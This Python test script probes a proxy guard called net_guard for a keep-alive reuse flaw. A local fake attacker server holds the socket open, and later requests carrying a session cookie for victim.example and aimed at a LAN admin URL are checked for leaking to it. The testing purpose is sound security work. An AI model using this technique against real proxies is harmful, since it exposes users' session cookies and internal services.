"""net_guard HTTP path: upstream (attacker) answers keep-alive; client (Chromium) reuses the proxy socket for a request
to ANOTHER host. Where does the second request go?"""
import sys, asyncio
sys.path.insert(0, "/home/user/assistant-ksenia/core")
from tools import net_guard

net_guard.ip_is_public = lambda ip: str(ip) == "127.0.0.1"   # "internet" = 127.0.0.1, "LAN" = 127.0.0.2
seen = []

async def evil(r, w):  # attacker's public server: ignores Connection: close, keeps the socket
    while True:
        try:
            head = await r.readuntil(b"\r\n\r\n")
        except Exception:
            break
        seen.append(head.split(b"\r\n")[0:3])
        body = b"hello from evil"
        w.write(b"HTTP/1.1 200 OK\r\nContent-Length: %d\r\nConnection: keep-alive\r\n\r\n" % len(body) + body)
        await w.drain()

async def main():
    srv = await asyncio.start_server(evil, "127.0.0.1", 0)
    eport = srv.sockets[0].getsockname()[1]
    pport = await net_guard.start()
    r, w = await asyncio.open_connection("127.0.0.1", pport)
    w.write(f"GET http://127.0.0.1:{eport}/first HTTP/1.1\r\nHost: 127.0.0.1:{eport}\r\nProxy-Connection: keep-alive\r\n\r\n".encode())
    await w.drain()
    print("resp1:", (await asyncio.wait_for(r.readuntil(b"evil"), 3))[:60])
    # second request on the same proxy connection to a DIFFERENT host (would be refused if checked: 127.0.0.2 = LAN)
    w.write(b"GET http://victim.example/account HTTP/1.1\r\nHost: victim.example\r\nCookie: session=SECRET\r\n\r\n")
    await w.drain()
    print("resp2:", (await asyncio.wait_for(r.readuntil(b"evil"), 3))[:60])
    w.write(b"GET http://127.0.0.2:8080/admin HTTP/1.1\r\nHost: 127.0.0.2\r\n\r\n")
    await w.drain()
    print("resp3:", (await asyncio.wait_for(r.readuntil(b"evil"), 3))[:60])
    print("requests that reached the attacker's server:")
    for s in seen: print("  ", s)

asyncio.run(main())
